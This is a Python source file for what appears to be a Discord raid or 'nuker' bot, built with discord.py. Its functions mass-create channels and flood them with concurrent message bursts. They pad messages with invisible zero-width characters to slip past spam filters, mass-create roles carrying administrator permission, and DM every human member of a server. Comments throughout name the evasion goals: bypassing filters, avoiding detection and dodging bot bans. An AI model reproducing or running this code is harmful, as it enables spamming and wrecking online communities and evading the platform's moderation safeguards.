import discord
import asyncio
import random

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ WORKER CORE - INTELLIGENT BURST MODE ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_stealth_text(text, premium):
    """Invisible obfuscation for premium bypass."""
    if not premium: return text
    chars = ["\u200b", "\u200c", "\u200d"]
    return f"{text}{''.join(random.choices(chars, k=3))}"

async def channel_worker(guild, name, text, index, amount, premium):
    """Specialized worker with Burst Mode for maximum speed."""
    try:
        channel = await guild.create_text_channel(f"{name}-{index+1}")
        
        # Burst Mode: Send messages in groups to bypass simple filters
        burst_size = 5
        for i in range(0, amount, burst_size):
            current_burst = min(burst_size, amount - i)
            tasks = []
            
            for _ in range(current_burst):
                tasks.append(channel.send(get_stealth_text(text, premium)))
            
            # Execute burst simultaneously
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check for rate limits in results
            for res in results:
                if isinstance(res, discord.HTTPException) and res.status == 429:
                    # If rate limited, wait exactly what Discord asks
                    wait_time = res.retry_after if hasattr(res, 'retry_after') else 1.0
                    await asyncio.sleep(wait_time)
                    break # Stop current burst and wait
            
            # Micro-jitter to keep the connection "alive" and avoid detection
            await asyncio.sleep(0.05)
            
    except: pass

async def role_worker(guild, count, name):
    """Mass role creation with error handling."""
    tasks = [guild.create_role(name=name, permissions=discord.Permissions(administrator=True)) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_dm_worker(guild, message, premium):
    """Optimized DM worker with adaptive pacing."""
    count = 0
    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(get_stealth_text(message, premium))
            count += 1
            # Dynamic delay to avoid global bot ban
            await asyncio.sleep(0.08) 
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 2.0)
            continue
        except: continue
    return count
